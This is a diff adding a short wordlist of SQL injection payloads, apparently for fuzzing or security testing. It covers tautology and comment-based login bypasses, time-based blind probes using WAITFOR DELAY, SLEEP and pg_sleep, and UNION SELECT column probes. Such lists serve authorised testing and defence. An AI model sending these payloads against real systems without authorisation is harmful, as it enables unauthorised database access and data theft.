@@ -1,0 +1,27 @@
+'
+''
+"
+\
+' OR 1=1--
+' OR 'a'='a
+" OR "a"="a
+') OR ('a'='a
+admin' --
+admin' #
+1' Waitfor Delay '0:0:5'--
+1; WAITFOR DELAY '0:0:5'--
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1" AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1' AND SLEEP(5)--
+' AND SLEEP(5) AND '1'='1
+1) AND SLEEP(5) AND (1=1
+1 OR SLEEP(5)
+1' OR SLEEP(5)--
+1" OR SLEEP(5)--
+pg_sleep(5)
+'; pg_sleep(5)--
+1 UNION SELECT NULL--
+1' UNION SELECT NULL--
+1" UNION SELECT NULL--
+1 UNION ALL SELECT NULL, NULL--
+1' UNION ALL SELECT NULL, NULL--
